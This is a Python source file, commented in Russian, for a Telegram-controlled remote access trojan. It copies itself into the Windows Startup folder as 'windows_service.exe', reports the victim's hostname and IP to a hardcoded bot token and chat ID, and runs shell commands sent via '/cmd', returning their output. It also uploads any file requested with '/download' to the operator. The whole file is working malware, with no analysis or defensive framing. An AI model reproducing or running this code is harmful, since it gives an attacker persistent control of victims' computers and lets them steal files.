import socket
import os
import subprocess
import sys
import requests
import time

# ======== НАСТРОЙКИ ========
BOT_TOKEN = '8375297234:AAF5ghYRhCecfH7GoBpqOHM9rpUg5M1nlSA'  # Получи у @BotFather
CHAT_ID = '6867449914'
# ===========================

def send_msg(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text}
        requests.post(url, data=data, timeout=10)
    except:
        pass

def main():
    try:
        # Добавляем в автозагрузку Windows
        if sys.platform == "win32":
            startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            if not os.path.exists(os.path.join(startup_dir, "windows_service.exe")):
                with open(os.path.join(startup_dir, "windows_service.exe"), "wb") as f:
                    f.write(open(sys.argv[0], "rb").read())
        
        # Отправляем сообщение о подключении
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        send_msg(f"🖥️ Устройство подключено!\nИмя: {hostname}\nIP: {ip}")
        
        # Основной цикл
        while True:
            try:
                # Проверяем команды
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
                response = requests.get(url, timeout=30).json()
                
                if response["ok"] and response["result"]:
                    for update in response["result"]:
                        if "message" in update and "text" in update["message"]:
                            text = update["message"]["text"]
                            chat_id = update["message"]["chat"]["id"]
                            
                            if str(chat_id) == CHAT_ID:
                                if text.startswith("/cmd"):
                                    command = text[5:]
                                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                                    output = result.stdout + result.stderr
                                    send_msg(f"Команда: {command}\nРезультат:\n{output}")
                                
                                elif text.startswith("/download"):
                                    file_path = text[10:]
                                    if os.path.exists(file_path):
                                        files = {"document": open(file_path, "rb")}
                                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                                        requests.post(url, data={"chat_id": CHAT_ID}, files=files)
            except:
                pass
            time.sleep(10)
    except Exception as e:
        send_msg(f"Ошибка: {str(e)}")

if __name__ == "__main__":
    main()
